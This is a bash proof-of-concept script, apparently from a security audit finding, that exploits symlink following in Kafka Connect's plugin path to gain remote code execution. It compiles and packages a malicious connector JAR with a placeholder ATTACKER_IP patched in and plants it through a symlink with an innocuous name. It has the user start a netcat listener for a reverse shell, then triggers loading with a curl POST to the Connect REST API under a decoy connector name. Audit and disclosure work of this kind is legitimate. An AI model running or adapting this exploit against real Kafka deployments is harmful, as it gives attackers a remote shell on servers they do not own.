#!/usr/bin/env bash
# ============================================================
# FINDING-003 PoC: Symlink Setup for Connect Plugin Path Traversal → RCE
# ============================================================
# Sets up the attacker-controlled JAR and symlink, then creates
# a connector via the Connect REST API to trigger classloading.
#
# Prerequisites:
#   - Write access to /opt/kafka/plugins/ (or the declared plugin.path)
#     OR write access to any directory reachable from there via symlink
#   - Network access to the Connect REST API (default port 8083)
#   - The compiled MaliciousConnector.jar from finding-003-malicious-plugin.java
#   - netcat listener on ATTACKER_IP:4444 for the reverse shell
#
# Run from a machine with plugin directory access:
# ============================================================

set -euo pipefail

PLUGIN_DIR="${1:-/opt/kafka/plugins}"
CONNECT_API="${2:-http://localhost:8083}"
ATTACKER_IP="${3:-ATTACKER_IP}"
ATTACKER_PORT="${4:-4444}"

MALICIOUS_JAR="/tmp/MaliciousConnector.jar"
SYMLINK_PATH="$PLUGIN_DIR/kafka-extra-plugin.jar"  # Innocuous-looking name

echo "[*] FINDING-003: Kafka Connect Plugin Symlink → RCE"
echo "[*] Plugin directory: $PLUGIN_DIR"
echo "[*] Connect API: $CONNECT_API"
echo "[*] Reverse shell target: $ATTACKER_IP:$ATTACKER_PORT"
echo ""

# ---- Step 1: Compile and package the malicious connector ----
echo "[1] Compiling MaliciousConnector.java..."
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Find kafka jars for compilation
KAFKA_CP=$(find /opt/kafka/libs -name "kafka-clients-*.jar" -o -name "connect-api-*.jar" 2>/dev/null | \
           tr '\n' ':' | sed 's/:$//')

if [[ -z "$KAFKA_CP" ]]; then
    echo "[-] Could not find Kafka jars. Set CLASSPATH manually."
    echo "    Example: export KAFKA_CP=/opt/kafka/libs/kafka-clients-3.9.0.jar:/opt/kafka/libs/connect-api-3.9.0.jar"
    KAFKA_CP="."
fi

# Patch the attacker IP and port into the source before compiling
TMPDIR=$(mktemp -d)
sed "s/ATTACKER_IP/$ATTACKER_IP/g; s/4444/$ATTACKER_PORT/g" \
    "$SCRIPT_DIR/finding-003-malicious-plugin.java" > "$TMPDIR/MaliciousConnector.java"

javac -cp "$KAFKA_CP" -d "$TMPDIR" "$TMPDIR/MaliciousConnector.java" && \
    echo "[+] Compiled successfully." || { echo "[-] Compilation failed."; exit 1; }

jar cf "$MALICIOUS_JAR" -C "$TMPDIR" MaliciousConnector.class \
                         -C "$TMPDIR" 'MaliciousConnector$MaliciousTask.class' && \
    echo "[+] Packaged to $MALICIOUS_JAR" || { echo "[-] JAR creation failed."; exit 1; }

# ---- Step 2: Create the symlink inside the declared plugin path ----
echo ""
echo "[2] Creating symlink: $SYMLINK_PATH -> $MALICIOUS_JAR"
ln -sf "$MALICIOUS_JAR" "$SYMLINK_PATH" && \
    echo "[+] Symlink created." || { echo "[-] Could not create symlink (check permissions)."; exit 1; }

echo "    Plugin path traversal: $SYMLINK_PATH resolves to $MALICIOUS_JAR"
echo "    PluginUtils.pluginUrls() will follow this symlink (FOLLOW_LINKS enabled)."

# ---- Step 3: Start a netcat listener for the reverse shell ----
echo ""
echo "[3] Start your listener before continuing:"
echo "    nc -lvnp $ATTACKER_PORT"
echo ""
read -rp "    Press ENTER when your listener is ready..."

# ---- Step 4: Trigger plugin loading via the Connect REST API ----
echo ""
echo "[4] Creating connector to trigger classloading of MaliciousConnector..."

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$CONNECT_API/connectors" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"diagnostic-connector-v2\",
    \"config\": {
      \"connector.class\": \"MaliciousConnector\",
      \"tasks.max\": \"1\",
      \"topics\": \"_connect-test\"
    }
  }")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -1)

echo "[*] HTTP Response: $HTTP_CODE"
echo "[*] Body: $BODY"

if [[ "$HTTP_CODE" =~ ^(200|201|409)$ ]]; then
    echo "[+] Connector creation accepted — classloading triggered."
    echo "[!] Check your netcat listener for the reverse shell."
else
    echo "[*] Unexpected response. The connector class may not have been found."
    echo "[*] Try restarting the Connect worker to force plugin re-scan."
    echo "    The worker rescans plugin.path on startup — symlink will be picked up."
fi

echo ""
echo "[*] To force plugin reload without restart, use the plugin scanning endpoint:"
echo "    curl -X POST $CONNECT_API/connectors/diagnostic-connector-v2/restart"

# ---- Cleanup note ----
echo ""
echo "[!] Cleanup (after test):"
echo "    rm -f $SYMLINK_PATH $MALICIOUS_JAR"
echo "    curl -X DELETE $CONNECT_API/connectors/diagnostic-connector-v2"
